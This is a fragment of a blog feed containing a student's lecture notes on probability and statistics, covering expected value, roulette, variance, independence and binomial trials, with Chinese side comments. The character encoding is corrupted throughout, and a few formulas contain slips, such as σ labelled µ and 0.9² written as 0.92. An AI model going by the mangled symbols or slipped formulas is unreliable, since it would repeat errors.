operations.</p><p><strong>Answer</strong>. If the element X is in the list, then the number of comparisons averages to $\frac{1}{n}(1+ \dots + n)$. If X is absent, we need n comparisons.</p><p>The first case has probability p, the second 1 âˆ’ p. Combining these we find</p><script type="math/tex; mode=display">E_n = p(\frac{1+ \dots + n}{n}) +(1âˆ’p)n \\ =p(\frac{n+1}{2})+(1âˆ’p)n \\ =(1-\frac{p}{2})n+\frac{p}{2}</script><p>As one would expect, <strong>increasing p leads to a lower</strong> $E_n$.</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-17-21-52.png" alt></p><h3 id="Success-vs-Expected-value"><a href="#Success-vs-Expected-value" class="headerlink" title="Success vs Expected value"></a>Success vs Expected value</h3><p><strong>Question</strong></p><p>Does high probability of success lead to a high expected value?</p><p>Generally, no.</p><h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h4><p>Buying more tickets in the lottery increases your chances of winning, but the expected value of winnings decreases.</p><p>èµ¢35å—é’±åŠ ä¸Šæ ¼å­ä¸Šçš„é’±ã€‚å› æ­¤ç­–ç•¥2çš„æ¦‚ç‡pæŒ‡å‘(35-24+1)=12$</p><p>Roulette (outcomes 0,1,â€¦,36). Win: $35 Ã— bet$</p><p><strong>Strategy 1</strong>: Bet $1 on a single number</p><ul><li>Probability of winning: $\frac{1}{37}$</li><li>Expected winnings: $\frac{1}{37}.($35)+\frac{36}{37}.(-$1)\approx âˆ’2.7c$</li></ul><p><strong>Strategy 2</strong>: Place $1 bets on 24 numbers, selected from among 0 to 36.</p><ul><li>Probability of winning: $\frac{24}{37} \approx 65\%$</li><li>Expected winnings:</li><li><ul><li>If one of the numbers comes up, win $35 from the bet on that number and lose $23 from the bets on the remaining numbers,</li></ul></li></ul><p>So expected winnings are:</p><script type="math/tex; mode=display">pÂ·\$12âˆ’qÂ·\$24 = \$12 \frac{24}{37} âˆ’\$24 \frac{13}{37} = âˆ’\$ \frac{24}{37} â‰ˆ âˆ’65c = 24Ã—âˆ’2.7c</script><h2 id="Gamblerâ€™s-ruin"><a href="#Gamblerâ€™s-ruin" class="headerlink" title="Gamblerâ€™s ruin"></a>Gamblerâ€™s ruin</h2><p>Many so-called â€™winning systemsâ€™ that purport to offer a winning strategy do something akin â€” they provide a scheme for frequent relatively moderate wins, but at the cost of an occasional very big loss.</p><p>It turns out (it is a formal theorem) that there can be no system that converts an â€˜unfairâ€™ game into a â€™fairâ€™ one. In the language of decision theory, â€˜unfairâ€™ denotes a game whose individual bets have negative expectation.</p><p><strong>It can be easily checked that any individual bets on roulette, on lottery tickets or on just about any commercially offered game have negative expected value.</strong></p><h1 id="Standard-Deviation-and-Variance"><a href="#Standard-Deviation-and-Variance" class="headerlink" title="Standard Deviation and Variance"></a>Standard Deviation and Variance</h1><h2 id="Definition-3"><a href="#Definition-3" class="headerlink" title="Definition"></a>Definition</h2><p>For random variable X with expected value (or: <strong>mean</strong>) $Âµ = E(X)$, the <strong>standard deviation</strong> of X is</p><script type="math/tex; mode=display">\sigma = \sqrt{E((X âˆ’Âµ)^2)}</script><p>and the <strong>variance</strong> of X is</p><script type="math/tex; mode=display">\sigma^2</script><p>Standard deviation and variance measure how spread out the values of a random variable are. The smaller $Ïƒ^2$ the more confident we can be that $X(Ï‰)$ is close to $E(X)$, for a randomly selected $Ï‰$.</p><p><strong>Take Notice</strong></p><p>The variance can be calculated as $E((X âˆ’ Âµ)^2) = E(X^2)âˆ’Âµ^2$, where $E(X^2) = \sum^{}_{k \in \mathbb{Z}} P(X = k)Â·k^2$</p><p>æ­¤å¤„æ–¹å·®è®¡ç®—å…¬å¼å’Œæˆ‘åœ¨ä¸­å›½å­¦çš„æ–¹å·®è®¡ç®—å…¬å¼ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œæ˜¯ç®€åŒ–çš„å¦ä¸€ç§å½¢å¼ã€‚</p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-18-03-20.png" alt></p><p><img src="/2024/11/19/Math/Statistics/2024-11-19-18-04-05.png" alt></p><h2 id="example"><a href="#example" class="headerlink" title="example"></a>example</h2><p><strong>Question</strong>. Let the random variable $X_d \overset{def}{=} value$ of a rolled die. What is(a)the mean, (b)the variance and (c) the standard deviation?</p><p>(a)</p><script type="math/tex; mode=display">Âµ=E(X_d)=3.5</script><p>(b)</p><script type="math/tex; mode=display">E(X_d^2)= \frac{1}{6} \cdot 1 + \frac{1}{6} \cdot 4 + \frac{1}{6} \cdot 9 + \frac{1}{6} \cdot 16+ \frac{1}{6} \cdot 25+ \frac{1}{6} \cdot 36 = \frac{91}{6}</script><p>Hence $\sigma^2=E(X_d^2)- \mu^2 = \frac{35}{12}$</p><p>(c)</p><script type="math/tex; mode=display">\mu = \sqrt{ \frac{35}{12} } \approx 1.71</script><h2 id="exercise"><a href="#exercise" class="headerlink" title="exercise"></a>exercise</h2><p><strong>Question (Supp)</strong>. Two independent experiments are performed.</p><p>$p_1$ = P(1st experiment succeeds) = 0.7</p><p>$p_2$ = P(2nd experiment succeeds) = 0.2. Random variable X counts the number of successful experiments.</p><ul><li>Expected value of X?</li><li>Probability of exactly one success?</li><li>Probability of at most one success?</li><li>Variance of X?</li></ul><p><strong>Answer</strong>. For experiment i, let $X_i = 1$ if the experiment is successful and $X_i = 0$ otherwise.</p><p>(a) $E(X) = E(X1)+E(X2) = 1Â·p1 +1Â·p2 = 0.7+0.2 = 0.9$.</p><p>è¿™é‡Œé—®çš„æœŸæœ›å€¼ï¼Œä¸€æ¬¡æˆåŠŸå°±æ˜¯1ï¼Œå¤±è´¥å°±æ˜¯0.æ‰€ä»¥Omegaæ˜¯2ï¼ŒæˆåŠŸå’Œå¤±è´¥æ˜¯å¯¹ç«‹äº‹ä»¶ã€‚å› ä¸ºä¸¤ä¸ªå®éªŒæ˜¯ç‹¬ç«‹ï¼Œä¸”é—®çš„æ˜¯æˆåŠŸçš„æœŸæœ›å€¼ï¼Œæ‰€ä»¥ç®—å’Œå³å¯ï¼Œä¸ç”¨è€ƒè™‘ä¹˜ã€‚æˆåŠŸæ˜¯0.9ï¼Œå¤±è´¥çš„æœŸæœ›å€¼æ˜¯0.3+0.8=1.1ã€‚</p><p>(b) $P(X = 1) = P(X1 =1,X2 = 0)+P(X1 =0,X2 = 1) =0.7Â·0.8 +0.3Â·0.2 = 0.62$.</p><p>(c) $P(X = 1)+P(X1 = X2 =0) =0.62+0.3Â·0.8 = 0.86$.</p><p>(d) $Ïƒ^2 = E(X^2)âˆ’E(X)^2 = (0.62Â·1+0.14Â·4)âˆ’0.92 = 0.37$.</p><p>æˆåŠŸä¸€æ¬¡çš„æœŸæœ›å€¼æ˜¯1ï¼Œæ¦‚ç‡æ˜¯(c)ä¸­ç»“æœï¼›æˆåŠŸä¸¤æ¬¡çš„æœŸæœ›å€¼æ˜¯2ï¼Œæ¦‚ç‡æ˜¯ 0.7*0.2ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Probability</title>
      <link href="/2024/11/18/Math/Probability/"/>
      <url>/2024/11/18/Math/Probability/</url>
      
        <content type="html"><![CDATA[<p>Lecture 14: Probability</p><ul><li><a href="#elementary-discrete-probability">Elementary Discrete Probability</a><ul><li><a href="#definition">Definition</a><ul><li><a href="#examples">Examples</a></li></ul></li><li><a href="#uniform-distribution">Uniform distribution</a><ul><li><a href="#examples-1">Examples</a></li></ul></li><li><a href="#computing-probabilities-by-counting">Computing Probabilities by Counting</a></li><li><a href="#combining-events">Combining events</a></li><li><a href="#inclusion-exclusion-rule">Inclusion-exclusion rule</a><ul><li><a href="#exercises">Exercises</a></li></ul></li><li><a href="#examples-2">Examples</a></li><li><a href="#exercises-1">Exercises 1</a></li><li><a href="#exercises-2">Exercises 2</a></li></ul></li><li><a href="#independence">Independence</a><ul><li><a href="#unifying-sets-of-outcomes">Unifying sets of outcomes</a></li><li><a href="#events-in-the-product-space">Events in the product space</a></li><li><a href="#probability-in-the-product-space">Probability in the product space</a></li><li><a href="#product-distribution">Product distribution</a></li><li><a href="#independence-1">Independence</a></li><li><a href="#independence-of-multiple-events">Independence of multiple events</a></li><li><a href="#example-dependent-events">Example: Dependent events</a></li><li><a href="#exercise">Exercise</a></li><li><a href="#example-sequences-of-independent-events">Example: Sequences of independent events</a></li><li><a href="#binomial-distribution">Binomial distribution</a><ul><li><a href="#exercise-die">exercise: die</a></li><li><a href="#exercise-die-2">exercise: die 2</a></li><li><a href="#exercise-ball">exercise: ball</a></li></ul></li></ul></li><li><a href="#infinite-sample-spaces-not-examinable">Infinite Sample Spaces (not examinable)</a></li><li><a href="#recursive-probability-computations">Recursive Probability Computations</a><ul><li><a href="#use-of-recursion-in-probability-computations">Use of Recursion in Probability Computations</a><ul><li><a href="#1-gain-t">1. gain T.</a></li><li><a href="#2-gain-h">2. gain H.</a></li><li><a href="#combine">combine</a></li></ul></li></ul></li><li><a href="#conditional-probability">Conditional Probability</a><ul><li><a href="#definition-1">Definition</a></li><li><a href="#conditional-probability-in-uniform-distributions">Conditional probability in uniform distributions</a></li><li><a href="#some-general-rules">Some General Rules</a><ul><li><a href="#example-1">example 1</a></li><li><a href="#example-2">example 2</a></li><li><a href="#example-3">example 3</a></li><li><a href="#example-4">example 4</a></li></ul></li></ul></li><li><a href="#independence-revisited----stochastic-independence-again">Independence, revisited â€” Stochastic Independence, again</a><ul><li><a href="#definition-2">Definition</a></li><li><a href="#exercise-1">exercise 1</a></li><li><a href="#exercise-2">exercise 2</a></li><li><a href="#exercise-3">exercise 3</a></li></ul></li></ul><h1 id="Elementary-Discrete-Probability"><a href="#Elementary-Discrete-Probability" class="headerlink" title="Elementary Discrete Probability"></a>Elementary Discrete Probability</h1><h2 id="Definition"><a href="#Definition" class="headerlink" title="Definition"></a>Definition</h2><p><strong>Sample space</strong>:</p><script type="math/tex; mode=display">\Omega = \{ w_1, \dots, w_n \}</script><p>Each point represents an outcome. æ ·æœ¬ç©ºé—´ï¼šåŒ…å«æ‰€æœ‰å¯èƒ½ç»“æœçš„é›†åˆã€‚</p><p><strong>Event</strong>: a collection of outcomes = subset of $â„¦$. äº‹ä»¶ï¼Œæ˜¯æ ·æœ¬ç©ºé—´çš„ä¸€ä¸ªå­é›†ã€‚</p><p><strong>Probability distribution</strong>: A function P : $Pow(\Omega)â†’ [0,1]$ ï¼ˆæ¦‚ç‡åˆ†å¸ƒï¼Œå®šä¹‰äº†æ¯ä¸ªäº‹ä»¶å‘ç”Ÿçš„æ¦‚ç‡ã€‚Powæ˜¯å¹‚é›†ï¼Œæ„æ€æ˜¯æ‰€æœ‰çš„å­é›†ã€‚ï¼‰such that:</p><ul><li>$P(â„¦) = 1$</li><li>$E$ and $F$ <strong>disjoint</strong> events then $P(E âˆªF) = P(E)+P(F)$.</li></ul><p>Fact</p><script type="math/tex; mode=display">P(âˆ…) = 0, P(E^c) = 1âˆ’P(E)</script><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>Tossing a coin: <strong>â„¦ = {H,T}</strong></p><script type="math/tex; mode=display">P(H) = P(T) =0.5</script><p>Rolling a die: <strong>â„¦ = {1,2,3,4,5,6}</strong></p><script type="math/tex; mode=display">P(1) = P(2) = P(3) = P(4) = P(5) = P(6) = \frac{1}{6}</script><h2 id="Uniform-distribution"><a href="#Uniform-distribution" class="headerlink" title="Uniform distribution"></a>Uniform distribution</h2><p>Each outcome $Ï‰_i$ equally likely:</p><script type="math/tex; mode=display">P(w_1)=P(w_2)= \dots =P(w_n)= \frac{1}{n}</script><p>This a called a <strong>uniform probability distribution</strong> over $â„¦$</p><h3 id="Examples-1"><a href="#Examples-1" class="headerlink" title="Examples"></a>Examples</h3><p>Tossing a coin: <strong>â„¦ = {H,T}</strong></p><script type="math/tex; mode=display">P(H) = P(T) =0.5</script><p>Rolling a die: <strong>â„¦ = {1,2,3,4,5,6}</strong></p><script type="math/tex; mode=display">P(1) = P(2) = P(3) = P(4) = P(5) = P(6) = \frac{1}{6}</script><h2 id="Computing-Probabilities-by-Counting"><a href="#Computing-Probabilities-by-Counting" class="headerlink" title="Computing Probabilities by Counting"></a>Computing Probabilities by Counting</h2><p>Computing probabilities with respect to a <strong>uniform</strong> distribution comes down to counting the size of the event.</p><p>If E = {$e_1$,â€¦,$e_k$} then</p><script type="math/tex; mode=display">P(E) = \Sigma^k_{i=1} P(e_i) = \Sigma^k_{i=1} \frac{1}{|\Omega|} = \frac{|E|}{|\Omega|}</script><p>Most of the counting rules carry over to probabilities wrt. a uniform distribution.</p><p>Important!</p><p>The expression â€œ<strong>selected at random</strong>â€, when not further qualified, means:</p><p>â€œsubject to/according to/â€¦a <strong>uniform</strong> distribution.â€</p><h2 id="Combining-events"><a href="#Combining-events" class="headerlink" title="Combining events"></a>Combining events</h2><p>We can create complex events by combining simpler ones.</p><p>Common constructions:</p><ul><li><p>A and B: $Aâˆ©B$</p></li><li><p>A or B: $AâˆªB$</p></li><li><p>Not A: $â„¦ \setminus A$</p></li><li><p><strong>A followed by B</strong></p></li></ul><p>The first three involve events from the <strong>same</strong> set of outcomes. The last may involve events from <strong>different</strong> sets of outcomes (e.g. roll die and flip coin).</p><h2 id="Inclusion-exclusion-rule"><a href="#Inclusion-exclusion-rule" class="headerlink" title="Inclusion-exclusion rule"></a>Inclusion-exclusion rule</h2><p>Fact</p><script type="math/tex; mode=display">P(AâˆªB) = P(A)+P(B)âˆ’P(Aâˆ©B) \\ P(AâˆªB âˆªC) = P(A)+P(B)+P(C)  âˆ’P(Aâˆ©B)âˆ’P(B âˆ©C)âˆ’P(C âˆ©A) +P(Aâˆ©B âˆ©C)</script><h3 id="Exercises"><a href="#Exercises" class="headerlink" title="Exercises"></a>Exercises</h3><p>Suppose an experiment leads to events A,B with probabilities $P(A) = 0.5,P(B) = 0.8,P(A âˆ© B) = 0.4$.</p><p>Find</p><ul><li>$P(B^c)$</li><li>$P(AâˆªB)$</li><li>$P(A^c âˆªB^c)$</li></ul><p>$1 âˆ’P(B) =0.2$</p><p>$P(A) +P(B)âˆ’P(Aâˆ©B) =0.9$</p><p>$1 âˆ’P((A^c âˆªB^c)^c) = 1âˆ’P(Aâˆ©B) =0.6$</p><p>You could draw a venn diagram, and found itâ€™s the intersection between A and B.</p><p><img src="/2024/11/18/Math/Probability/2024-11-18-18-56-32.png" alt></p><hr><p>Given $P(A)=0.6$, $P(B)=0.7$, show $P(Aâˆ©B)â‰¥0.3$</p><script type="math/tex; mode=display">P(Aâˆ©B) =P(A)+P(B)âˆ’P(AâˆªB) \\=0.6+0.7âˆ’P(AâˆªB) \\â‰¥0.6+0.7âˆ’1 = 0.3</script><h2 id="Examples-2"><a href="#Examples-2" class="headerlink" title="Examples"></a>Examples</h2><p><strong>Question</strong>. A four-digit number n is selected at random (i.e. randomly from [1000,â€¦,9999]). Find the probability p that n has all of 0, 1, 2 among its digits.</p><p><strong>Answer (approach)</strong>. Let $q = 1âˆ’p$ be the complementary probability and define</p><script type="math/tex; mode=display">A_i = \{n : \text{ no digit } i\},A_{ij} = \{n : \text{ no digits } i,j\},A_{ijk} = \{n : no \quad i,j,k\}</script><p>Then define</p><p>$T =A_0âˆªA_1âˆªA_2 =${n: missing at least one of 0,1,2}</p><p>$S =(A_0âˆªA_1âˆªA_2)^c =${n : containing all of 0,1,2}</p><p>Once we find the cardinality of T, the solution is</p><script type="math/tex; mode=display">q = \frac{|T|}{9000}, p = 1-q</script><p>To find $|A<em>i|,|A</em>{ij}|,|A_{ijk}|$ we reflect on how many choices are available for the first digit, for the second etc. A special case is the leading digit, which must be 1,â€¦,9</p><p><strong>Answer (arithmetic).</strong></p><script type="math/tex; mode=display">|A_0|=9^4, |A_1| = |A_2| = 8 \cdot 9^3 \\ |A_{01}| = |A_{02}| = 8^4, \\ |A_{12}| = 7 \cdot 8^3,|A_{012}| = 7^4, \\|T| = |A_0 âˆªA_1 âˆªA_2| \\= |A_0| +|A_1|+|A_2|âˆ’|A_0 âˆ©A_1|âˆ’|A_0 âˆ©A_2|âˆ’|A_1 âˆ©A_2| \\+|A_0 âˆ©A_1 âˆ©A_2| \\=9^4 +2Â·8Â·9^3 âˆ’2Â·8^4 âˆ’7Â·8^3 +7^4 \\=25Â·9^3 âˆ’23Â·8^3 +7^4 = 8850</script><p>Hence</p><script type="math/tex; mode=display">q=\frac{8850}{9000}, p =1âˆ’q \approx 0.01667</script><p>Previous example generalised: Probability of an r-digit number having all of 0,1,2,3 among its digits.</p><p>We use the previous notation: $A<em>i$ â€” set of numbers n missing digit i, and similarly for all $A</em>{ij}$â€¦</p><p>We aim to find the size of $T = A_0 âˆªA_1 âˆªA_2 âˆªA_3$, and then to compute $|S| = 9Â·10^{râˆ’1} âˆ’|T|$.</p><script type="math/tex; mode=display">|A_0 âˆªA_1 âˆªA_2 âˆªA_3| = sum of |A_i| \\âˆ’ sum of |A_i âˆ©A_j| \\+ sum of |A_i âˆ©A_j âˆ©A_k| \\âˆ’ sum of |A_i âˆ©A_j âˆ©A_k âˆ©A_l|</script><h2 id="Exercises-1"><a href="#Exercises-1" class="headerlink" title="Exercises 1"></a>Exercises 1</h2><p>(Supp) Of 100 problems, 75 are â€˜easyâ€™ and 40 â€˜importantâ€™.</p><p>(b) n problems <strong>chosen randomly</strong>. What is the probability that all n are important?</p><script type="math/tex; mode=display">p=\frac{\binom{40}{n}}{\binom{100}{n}}</script><h2 id="Exercises-2"><a href="#Exercises-2" class="headerlink" title="Exercises 2"></a>Exercises 2</h2><p>A 4-letter word is selected at random from $Î£^4$,where <strong>Î£={a,b,c,d,e}</strong>. What is the probability that</p><p>(a) the letters in the word are all distinct?</p><script type="math/tex; mode=display">|E| = (5)_4, P(E)=\frac{5 \cdot 4 \cdot 3 \cdot 2 \cdot 1}{(5-4)! \cdot 5^4} = \frac{120}{625} \approx 19\%</script><p>(b) there are no vowels (â€œaâ€,â€œeâ€) in the word?</p><script type="math/tex; mode=display">|E| = 3^4, P(E)=\frac{3^4}{5^4}=\frac{81}{625} \approx 13\%</script><p>(c) the word begins with a vowel?</p><script type="math/tex; mode=display">|E| = 2Â·5^3,  P(E) = \frac{2Â·5^3}{5^4} = \frac{2}{5}</script><h1 id="Independence"><a href="#Independence" class="headerlink" title="Independence"></a>Independence</h1><h2 id="Unifying-sets-of-outcomes"><a href="#Unifying-sets-of-outcomes" class="headerlink" title="Unifying sets of outcomes"></a>Unifying sets of outcomes</h2><p>To combine events from different sets of outcomes we unify the sample space using the <strong>product space</strong>: $\Omega_1 \times \Omega_2 \times \dots \times \Omega_n$</p><p>Example</p><p>Flipping a coin and rolling a die:</p><p>â„¦1 ={heads,tails}</p><p>â„¦2 ={1,2,3,4,5,6}</p><p>â„¦=â„¦1Ã—â„¦2 ={(heads,1),(heads,2),â€¦}</p><p>Take Notice</p><p>This approach can also be used to model sequences of outcomes.</p><h2 id="Events-in-the-product-space"><a href="#Events-in-the-product-space" class="headerlink" title="Events in the product space"></a>Events in the product space</h2><p>Events are lifted into the product space by restricting the appropriate co-ordinate. E.g. $A âŠ† â„¦_1$ translates to $Aâ€² = AÃ—â„¦_2Ã—â€¦Ã—â„¦_n$</p><p>Example</p><p>Coin shows heads and die shows an even number:</p><p>â„¦1 ={heads,tails}</p><p>A ={heads}</p><p>â„¦2 ={1,2,3,4,5,6}</p><p>B ={2,4,6}</p><script type="math/tex; mode=display">â„¦=â„¦1Ã—â„¦2 =\{(heads,1),(heads,2),...\}</script><script type="math/tex; mode=display">Aâ€² = AÃ—â„¦_2 \quad Bâ€²=â„¦_1Ã—B</script><p>â€œA and Bâ€ or â€œA followed by Bâ€ corresponds to:</p><script type="math/tex; mode=display">Aâ€² âˆ©Bâ€² = (AÃ—â„¦2)âˆ©(â„¦1Ã—B)=AÃ—B</script><h2 id="Probability-in-the-product-space"><a href="#Probability-in-the-product-space" class="headerlink" title="Probability in the product space"></a>Probability in the product space</h2><p><strong>Take Notice</strong></p><p>Cannot assume that $P(A Ã—B) = P(A)P(B)$</p><p>è¿™é‡Œä¹ä¸€çœ‹æœ‰ç‚¹é—®é¢˜ï¼Œå› ä¸ºæ˜æ˜¾Aâ€™å’ŒBâ€™æœ‰ä¸ªäº¤é›†ã€‚å›¾ä¸­è¡¨ç¤ºç¬¬ä¸€æšç¡¬å¸å’Œç¬¬äºŒæšç¡¬å¸çš„æ–¹å¼ï¼Œä¸åº”è¯¥å¦‚å›¾ä¸­å»å†™è¿™ä¸ªå…ƒç»„å’Œé›†åˆã€‚</p><p>é¦–å…ˆè€ƒè™‘é¡ºåºï¼Œè‚¯å®šç”¨å…ƒç»„ï¼Œä½†æ˜¯è¦ç”¨(HH), (HT)å°±è¡Œï¼Œä½†æ˜¯å¯ä»¥è¯´æ— æ³•ç›´æ¥æ‰¾åˆ°ç¬¦åˆæƒ…å†µçš„ä¾‹å­ã€‚</p><p>ä½†æ˜¯å›¾ä¸­è¿™é‡Œæ˜¯è¯´ï¼Œ(H,TT)æ˜¯ä¸ªç©ºé›†å®é™…ä¸Šã€‚</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-13-06.png" alt></p><h2 id="Product-distribution"><a href="#Product-distribution" class="headerlink" title="Product distribution"></a>Product distribution</h2><p>Given probability distributions on the <strong>component spaces</strong>, there is a natural probability distribution on the <strong>product space</strong>:</p><script type="math/tex; mode=display">P(E_1 Ã—E_2 Ã—...Ã—E_n) = P_1(E_1)Â·P_2(E_2)Â·Â·Â·P_n(E_n)</script><p>Intuitively, the probability of an event in one dimension is not affected by the outcomes in the other dimensions.</p><p><strong>Fact</strong></p><p>If the $P_i$ are uniform distributions then so is the product distribution.</p><h2 id="Independence-1"><a href="#Independence-1" class="headerlink" title="Independence"></a>Independence</h2><p>Informally, events are <strong>independent</strong> if the outcomes in one do not affect the outcomes in the other.</p><p>More generally, we define independence on events of the same sample space.</p><p><strong>Definition</strong></p><p>A and B are (<strong>stochastically</strong>) independent (notation: $AâŠ¥B$) if $P(Aâˆ©B) =P(A)Â·P(B)$</p><p><strong>Important!</strong></p><p>Unless specified otherwise, we assume independence when <strong>unifying</strong> events (where appropriate).</p><h2 id="Independence-of-multiple-events"><a href="#Independence-of-multiple-events" class="headerlink" title="Independence of multiple events"></a>Independence of multiple events</h2><p>Independence of $A_1,â€¦,A_n (A_1âŠ¥A_2âŠ¥Â·Â·Â·âŠ¥A_n)$</p><script type="math/tex; mode=display">P(A_1 âˆ©A_2 âˆ©...âˆ©A_k) = P(A_1)Â·P(A_2)Â·Â·Â·P(A_k)</script><p>This is often called (for emphasis) a <strong>full</strong> independence</p><p><strong>Pairwise</strong> independence is a <strong>weaker</strong> concept.</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-28-33.png" alt></p><h2 id="Example-Dependent-events"><a href="#Example-Dependent-events" class="headerlink" title="Example: Dependent events"></a>Example: Dependent events</h2><p>Basic non-independent sets of events (assuming non-trivial  probabilities)</p><ul><li><p>$A âŠ†B$</p></li><li><p>$Aâˆ©B =âˆ…$</p></li><li><p>Any pair of one-point events A = {x}, B = {y}: either x = y and $A âŠ† B$ or $x \neq y$ and $Aâˆ©B =âˆ…$</p></li></ul><h2 id="Exercise"><a href="#Exercise" class="headerlink" title="Exercise"></a>Exercise</h2><p>$âŠ¥$ åœ¨æ¦‚ç‡ä¸Šè¡¨ç¤ºç‹¬ç«‹äº‹ä»¶ã€‚</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-34-19.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-39-55.png" alt></p><h2 id="Example-Sequences-of-independent-events"><a href="#Example-Sequences-of-independent-events" class="headerlink" title="Example: Sequences of independent events"></a>Example: Sequences of independent events</h2><p>(a)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-33.png" alt></p><p>(b)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-47.png" alt></p><p>(c)</p><p><img src="/2024/11/18/Math/Probability/2024-11-20-15-40-58.png" alt></p><p>è¿™é‡Œæˆ‘æœ€å¼€å§‹å¯¹BO7è·èƒœç»ˆæ­¢æ¡ä»¶æœ‰ç–‘æƒ‘ï¼Œä½†æ˜¯åæ¥è‡ªå·±ç®—äº†ä¸‹å’Œæƒ³äº†æƒ³ï¼Œå…¶å®è¿™é‡Œä¸ºä»€ä¹ˆèµ¢äº†3ç›˜å°±å¯ä»¥äº†(a)ä½†è¿˜ç®—èµ¢4èµ¢5èµ¢6.å› ä¸ºå¦‚æœç¬¬äºŒç¬¬ä¸‰ç¬¬å››ç›˜èµ¢äº†3ç›˜ï¼ŒAé˜Ÿè‡ªåŠ¨èµ¢äº†å·²ç»ï¼Œè¿™å°±æ˜¯$\binom{6}{3}$ï¼Œå‰©ä¸‹çš„ç›˜æ•°Béƒ½ç®—è‡ªåŠ¨è¾“ã€‚$\binom{6}{4}$æ˜¯è¯´6ä¸ªä½ç½®æ’4ä¸ªç»„åˆï¼Œä¸€ä¸ªæ˜¯Aèµ¢å¾—3ï¼Œä¸€ä¸ªæ˜¯Bèµ¢å¾—1ï¼Œæ‰€ä»¥æ˜¯$\binom{6}{4}$ã€‚</p><h2 id="Binomial-distribution"><a href="#Binomial-distribution" class="headerlink" title="Binomial distribution"></a>Binomial distribution</h2><p>A useful corollary:</p><p><strong>Fact</strong></p><p>In a sequence of n ndependent trials, each with a probability of p of success:</p><script type="math/tex; mode=display">P(exactly k successes) = \binom{n}{k} p^kq^{n-k}</script><p>where q = (1âˆ’p)</p><p><strong>Take Notice</strong></p><p>This leads to a probability distribution on sequences of outcomes, known as the <strong>binomial distribution</strong>.</p><p>æ¯”å¦‚BO7ï¼Œèµ¢å¾—æ¦‚ç‡æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯ç¬¬ä¸€æŠŠå’Œç¬¬äºŒæŠŠæˆ–è€…æ›´å¤šçš„ç›˜ï¼Œäº’ç›¸ä¹‹é—´æ˜¯ç‹¬ç«‹çš„ã€‚æ‰€ä»¥éµä»äºŒé¡¹åˆ†å¸ƒã€‚</p><h3 id="exercise-die"><a href="#exercise-die" class="headerlink" title="exercise: die"></a>exercise: die</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-35-42.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-45-15.png" alt></p><h3 id="exercise-die-2"><a href="#exercise-die-2" class="headerlink" title="exercise: die 2"></a>exercise: die 2</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-50-27.png" alt></p><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-50-19.png" alt></p><p>è¿™ä¸ªcheckæ¯”è¾ƒç²¾é«“ï¼Œ(4,4)æ˜¯äº¤é›†ã€‚</p><h3 id="exercise-ball"><a href="#exercise-ball" class="headerlink" title="exercise: ball"></a>exercise: ball</h3><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-52-36.png" alt></p><h1 id="Infinite-Sample-Spaces-not-examinable"><a href="#Infinite-Sample-Spaces-not-examinable" class="headerlink" title="Infinite Sample Spaces (not examinable)"></a>Infinite Sample Spaces (not examinable)</h1><p>æš‚æ—¶å…ˆè¿‡è¿™å—å„¿ï¼Œåæ­£è¯´æ˜¯ä¸è€ƒ</p><h1 id="Recursive-Probability-Computations"><a href="#Recursive-Probability-Computations" class="headerlink" title="Recursive Probability Computations"></a>Recursive Probability Computations</h1><h2 id="Use-of-Recursion-in-Probability-Computations"><a href="#Use-of-Recursion-in-Probability-Computations" class="headerlink" title="Use of Recursion in Probability Computations"></a>Use of Recursion in Probability Computations</h2><p><img src="/2024/11/18/Math/Probability/2024-11-21-06-57-01.png" alt></p><p>é—®çš„æ˜¯æ²¡æœ‰â€œHHâ€å¦‚æœåªæŠ›</p><p>There are talking without successive <em>HEAD</em> â€œ<code>HH</code>â€œ.</p><p><strong>Firstly</strong>, toss a coin for one time, then gain <code>H</code> or <code>T</code>. Both have no <code>HH</code>, so <code>N(1)=2</code>.</p><p><strong>Secondly</strong>, toss a coin for two times, then gain <code>HH</code> <code>HT</code> <code>TH</code> <code>TT</code>. <code>HH</code> cannot hold, exclude it then we gain 3 legal sequences, so <code>N(2)=3</code>.</p><p>Thirdly, toss a coin for three times, then we would gain H or T in third time. Then classify its situations: (<strong>you can imagine 3rd as Nth time</strong>)</p><h3 id="1-gain-T"><a href="#1-gain-T" class="headerlink" title="1. gain T."></a>1. gain T.</h3><p>Because Nth time we gain <code>T</code>, so we wonâ€™t worry about the <code>H</code> or <code>T</code> of the coin of <code>(N-1) time</code>. Hence, if gain T in Nth time, it would have (N-1)â€™s number of sequences. <code>N(N) = N(N-1) iff Nth is T</code>.</p><h3 id="2-gain-H"><a href="#2-gain-H" class="headerlink" title="2. gain H."></a>2. gain H.</h3><p>If we want to gain without <code>HH</code>, hence it demands the result of the coin in (N-1) time cannot be <code>H</code>. So if Nth gain <code>H</code>, then (N-1)th must be <code>T</code>. Then (N-1) is <code>T</code>, so the number of the sequences will be (N-1)â€™s number of sequences. <code>N(N) = N(N-2) iff Nth is H</code>.</p><h3 id="combine"><a href="#combine" class="headerlink" title="combine"></a>combine</h3><p>Hence <code>N(N) = N(N-1) + N(N-2)</code>, and <code>N(1)=2</code> <code>N(2)=3</code></p><div 